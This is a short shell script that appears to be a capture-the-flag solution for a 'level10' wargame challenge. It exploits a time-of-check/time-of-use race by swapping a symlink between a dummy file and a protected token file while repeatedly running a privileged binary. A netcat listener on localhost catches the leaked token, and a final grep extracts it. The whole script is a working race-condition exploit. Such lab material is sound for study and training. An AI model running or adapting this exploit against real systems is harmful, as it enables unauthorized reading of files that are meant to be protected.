#!/bin/sh
# sh race.sh  -> spam the symlink swap until open() grabs the token, not the dummy
rm -f /tmp/out10 /tmp/l10
printf 'DUMMYCONTENT123\n' > /tmp/dummy
end=$(( $(date +%s) + 55 ))
( while [ $(date +%s) -lt $end ]; do
    ln -sf /tmp/dummy /tmp/l10
    ln -sf /home/user/level10/token /tmp/l10
  done ) &
( while [ $(date +%s) -lt $end ]; do nc -l 6969 >> /tmp/out10 2>/dev/null; done ) &   # -l, not -lp: openbsd nc, don't ask
( while [ $(date +%s) -lt $end ]; do ~/level10 /tmp/l10 127.0.0.1 >/dev/null 2>&1; done ) &
wait
grep -avE 'DUMMYCONTENT123|^\.\*\( \)\*\.$' /tmp/out10 | sort -u   # whatever isn't the dummy or the banner :D
